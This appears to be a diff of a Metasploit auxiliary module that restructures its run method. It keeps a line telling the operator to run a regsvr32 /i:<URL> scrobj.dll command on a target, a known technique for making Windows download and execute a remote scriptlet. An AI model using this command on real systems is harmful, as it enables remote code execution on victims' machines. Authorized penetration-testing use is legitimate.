@@ -38,10 +38,13 @@ class MetasploitModule < Msf::Auxiliary
 
 
   def run
-    start_service
+    exploit
+  end
+
+
+  def primer
     print_status("Run the following command on the target machine:")
     print_line("regsvr32 /s /n /u /i:#{get_uri} scrobj.dll")
-    self.service.wait
   end
 
   def on_request_uri(cli, _request)
